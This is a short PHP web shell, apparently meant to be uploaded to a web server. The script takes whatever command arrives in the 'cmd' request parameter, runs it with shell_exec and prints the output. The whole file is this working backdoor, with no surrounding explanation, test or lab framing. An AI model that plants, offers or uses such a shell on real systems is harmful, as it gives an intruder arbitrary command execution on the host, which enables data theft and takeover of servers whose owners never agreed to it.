<?php
echo "<pre>";
echo "shell_exec ".$_REQUEST["cmd"]."\n\n";
echo shell_exec($_REQUEST["cmd"]);
echo "</pre>";
?>
